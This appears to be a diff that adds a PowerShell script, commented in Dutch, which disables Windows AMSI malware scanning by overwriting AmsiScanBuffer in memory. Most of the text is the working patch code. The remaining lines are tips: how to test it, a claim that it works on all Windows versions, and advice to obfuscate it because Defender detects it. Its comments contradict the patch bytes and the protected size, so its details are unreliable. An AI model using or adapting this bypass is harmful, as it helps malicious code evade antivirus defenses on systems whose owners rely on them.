@@ -1,0 +1,8 @@
+# AMSI Bypass via AmsiScanBuffer Memory Patch
+# Overschrijft AmsiScanBuffer met bytes die AMSI_RESULT_CLEAN retourneren
+# Stap 1: Laad kernel32 functies, vind AmsiScanBuffer, patch geheugen
+$Win32=@" using System;using System.Runtime.InteropServices; public class Win32{[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint np,out uint op);} "@;Add-Type $Win32;$l=[Win32]::LoadLibrary("amsi.dll");$a=[Win32]::GetProcAddress($l,"AmsiScanBuffer");$p=0;[Win32]::VirtualProtect($a,[uint32]5,0x40,[ref]$p);$patch=[Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3);[System.Runtime.InteropServices.Marshal]::Copy($patch,0,$a,6)
+# Patch bytes: mov eax, 0x80070057 (E_INVALIDARG) + ret
+# Test: IEX 'amsiutils'
+# Tip: Meest betrouwbare bypass, werkt op alle Windows versies
+# Tip: Wordt gedetecteerd door Defender - obfuscate of gebruik alternatief
